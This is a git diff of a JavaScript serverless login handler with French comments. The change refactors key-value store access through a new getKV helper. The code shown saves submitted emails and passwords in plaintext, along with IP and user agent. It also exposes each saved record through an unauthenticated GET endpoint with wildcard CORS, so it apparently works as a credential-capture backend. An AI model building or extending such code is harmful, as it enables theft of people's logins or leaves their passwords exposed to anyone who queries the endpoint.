@@ -32,11 +32,12 @@ export async function onRequestGet({ request, env }) {
     return json({ success: false, message: 'Paramètre id manquant' }, 400);
   }
 
-  if (!env || !env.LOGINS || typeof env.LOGINS.get !== 'function') {
+  const KV = getKV(env);
+  if (!KV || typeof KV.get !== 'function') {
     return json({ success: false, message: 'KV LOGINS non configurée' }, 500);
   }
 
-  const raw = await env.LOGINS.get(id);
+  const raw = await KV.get(id);
   if (!raw) {
     return json({ success: false, message: 'Aucun enregistrement trouvé pour cet id' }, 404);
   }
@@ -75,9 +76,10 @@ export async function onRequestPost({ request, env }) {
 
     // Si une KV LOGINS est liée, on enregistre en clair (à vos risques; non recommandé)
     try {
-      if (env && env.LOGINS && typeof env.LOGINS.put === 'function') {
+      const KV = getKV(env);
+      if (KV && typeof KV.put === 'function') {
         const payload = { email, password, receivedAt, ip, userAgent };
-        await env.LOGINS.put(id, JSON.stringify(payload));
+        await KV.put(id, JSON.stringify(payload));
       }
     } catch (err) {
       // On ne bloque pas la réponse si la KV échoue
@@ -110,4 +112,17 @@ function json(payload, status = 200) {
       'Access-Control-Allow-Origin': '*'
     }
   });
+}
+
+// Helper: tente plusieurs noms de binding pour la KV
+function getKV(env) {
+  return (
+    env?.LOGINS ||
+    env?.LOGINS_KV ||
+    env?.KV_LOGINS ||
+    env?.logins ||
+    env?.['logins_kv'] ||
+    env?.['logins-kv'] ||
+    null
+  );
 }
